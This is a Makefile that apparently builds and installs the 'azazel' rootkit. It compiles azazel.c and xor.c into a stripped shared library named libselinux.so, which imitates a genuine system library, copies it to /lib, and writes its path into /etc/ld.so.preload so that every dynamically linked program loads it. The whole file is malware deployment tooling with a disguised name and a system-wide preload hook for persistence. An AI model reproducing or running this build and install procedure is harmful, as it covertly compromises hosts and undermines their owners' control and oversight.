INSTALL=/lib

CFLAGS+= -Wall
LDFLAGS+= -lc -ldl -lutil

all: config libselinux.so

config:
	@python config.py > const.h

libselinux.so: azazel.c 
	$(CC) -fPIC -g -c azazel.c xor.c
	$(CC) -fPIC -shared -Wl,-soname,libselinux.so azazel.o xor.o  $(LDFLAGS) -o libselinux.so
	strip libselinux.so

install: all
	@echo [-] Initiating Installation Directory $(INSTALL)
	@test -d $(INSTALL) || mkdir $(INSTALL)
	@echo [-] Installing azazel 
	@install -m 0755 libselinux.so $(INSTALL)/
	@echo [-] Injecting azazel
	@echo $(INSTALL)/libselinux.so > /etc/ld.so.preload

clean:
	rm libselinux.so *.o

